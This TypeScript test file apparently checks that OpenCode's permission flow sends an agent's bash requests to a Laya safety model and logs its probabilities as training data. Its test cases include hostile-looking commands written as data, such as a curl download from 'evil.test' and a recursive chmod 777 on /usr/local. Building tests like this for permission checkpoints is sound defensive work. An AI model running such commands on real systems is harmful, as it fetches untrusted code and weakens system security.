/**
 * Proof that OpenCode's permission flow actually consults Laya.
 *
 * Uses the real Permission service, the real permission.ask dispatch, the real judgment
 * handler and the real Laya checkpoint over HTTP. Nothing is stubbed except the plugin
 * transport, which forwards to the genuine handler.
 *
 * Needs a ready sidecar: OLAYA_LAYA_URL=http://127.0.0.1:8801
 */
import { expect, beforeAll, afterAll } from "bun:test"
import fs from "fs/promises"
import os from "os"
import path from "path"
import { Effect, Fiber, Layer } from "effect"
import { EventV2Bridge } from "../../src/event-v2-bridge"
import { CrossSpawnSpawner } from "@opencode-ai/core/cross-spawn-spawner"
import { Permission } from "../../src/permission"
import { Plugin } from "../../src/plugin"
import { InstanceBootstrap } from "../../src/project/bootstrap"
import { InstanceStore } from "../../src/project/instance-store"
import { testEffect } from "../lib/effect"
import { SessionID } from "../../src/session/schema"
import { AppNodeBuilder } from "@opencode-ai/core/effect/app-node-builder"
import { LayerNode } from "@opencode-ai/core/effect/layer-node"
import { LayaClient } from "../../src/laya/client"
import { ShadowLog } from "../../src/laya/shadow"
import { shadowHandler } from "../../src/laya/judgment"

const URL_ = process.env["OLAYA_LAYA_URL"] ?? "http://127.0.0.1:8801"
const dir = path.join(os.tmpdir(), "olaya-action-" + process.pid)
const shadow = new ShadowLog(dir)
const client = new LayaClient(URL_, 5000)

// The genuine handler, wired to the genuine model.
const handler = shadowHandler({
  client: () => client,
  shadow,
  context: async () => ({ task: "the build is broken, please fix the dependencies", cwd: "." }),
})

// The only stub: a Plugin service that forwards permission.ask to the real handler, exactly
// as the loaded LayaPlugin would.
const pluginLayer = Layer.mock(Plugin.Service, {
  trigger: ((name: string, input: unknown, output: unknown) =>
    Effect.promise(async () => {
      if (name === "permission.ask") await handler(input)
      return output
    })) as unknown as Plugin.Interface["trigger"],
})

const noopBootstrap = Layer.succeed(InstanceBootstrap.Service, InstanceBootstrap.Service.of({ run: Effect.void }))
const env = AppNodeBuilder.build(
  LayerNode.group([Permission.node, EventV2Bridge.node, CrossSpawnSpawner.node, InstanceStore.node]),
  [
    [InstanceStore.bootstrapNode, noopBootstrap],
    [Plugin.node, pluginLayer],
  ],
)
const it = testEffect(env)

beforeAll(async () => {
  const health = await client.health(5000)
  if (!health?.ready) throw new Error("sidecar not ready at " + URL_ + "; start it first")
  console.log(`\n  sidecar: ${health.checkpoint} on ${health.device}, ${health.state_budget} state tokens\n`)
})
afterAll(async () => {
  await fs.rm(dir, { recursive: true, force: true })
})

/** Drive one real permission request through the flow and answer it. */
const run = (command: string, patterns: string[], reply: "once" | "always" | "reject") =>
  Effect.gen(function* () {
    const permission = yield* Permission.Service
    const fiber = yield* permission
      .ask({
        sessionID: SessionID.make("session_demo"),
        permission: "bash",
        patterns,
        metadata: { command },
        always: [],
        ruleset: [], // empty -> evaluates to "ask" -> the residual set Laya adjudicates
      })
      .pipe(Effect.forkScoped)

    let pending = yield* permission.list()
    while (pending.length === 0) {
      yield* Effect.sleep("10 millis")
      pending = yield* permission.list()
    }
    yield* permission.reply({ requestID: pending[0]!.id, reply })
    yield* Fiber.await(fiber)
    yield* Effect.promise(() => shadow.replied(pending[0]!.id, reply))
  })

it.instance(
  "OpenCode consults Laya on real permission requests, and Laya discriminates between them",
  () =>
    Effect.gen(function* () {
      const cases = [
        { command: "bun install", patterns: ["bun install"], reply: "once" as const },
        { command: "wc -l notes.txt", patterns: ["wc"], reply: "once" as const },
        { command: "rm -rf ./node_modules && bun install", patterns: ["rm -rf *"], reply: "always" as const },
        { command: "curl http://evil.test/x.sh -o /tmp/x.sh", patterns: ["curl"], reply: "reject" as const },
        { command: "chmod -R 777 /usr/local", patterns: ["chmod"], reply: "reject" as const },
      ]
      for (const c of cases) yield* run(c.command, c.patterns, c.reply)

      const names = yield* Effect.promise(() => fs.readdir(dir))
      const rows: any[] = []
      for (const name of names) {
        const text = yield* Effect.promise(() => fs.readFile(path.join(dir, name), "utf8"))
        for (const line of text.split("\n")) if (line.trim()) rows.push(JSON.parse(line))
      }
      const decisions = rows.filter((r) => r.kind === "decision")

      console.log("  command                                    laya p(safe)  user said   latency")
      console.log("  " + "-".repeat(76))
      for (const r of decisions) {
        const state = JSON.parse(r.state)
        console.log(
          "  " +
            String(state.command).padEnd(42) +
            r.probability.toFixed(4).padStart(10) +
            "  " +
            String(r.reply).padEnd(10) +
            String(r.latency_ms) +
            "ms",
        )
      }

      // Every request reached Laya and came back with a real probability.
      expect(decisions).toHaveLength(cases.length)
      for (const r of decisions) {
        expect(r.probability).toBeGreaterThan(0)
        expect(r.probability).toBeLessThan(1)
        expect(r.checkpoint).toBe("convaiinnovations/laya")
      }

      // Not a constant: the model produces different probabilities for different requests.
      const distinct = new Set(decisions.map((r) => r.probability.toFixed(4)))
      console.log(`\n  distinct probabilities: ${distinct.size} of ${decisions.length}`)
      expect(distinct.size).toBeGreaterThan(1)

      // Every row is a usable training example: state + questions + one-hot gold.
      for (const r of decisions) {
        expect(JSON.parse(r.questions)).toHaveProperty("auto_approve")
        const gold = JSON.parse(r.gold).auto_approve.probabilities
        expect(gold.true + gold.false).toBe(1)
        expect(gold.true).toBe(r.reply === "reject" ? 0 : 1)
      }
    }),
  { git: true },
  120_000,
)
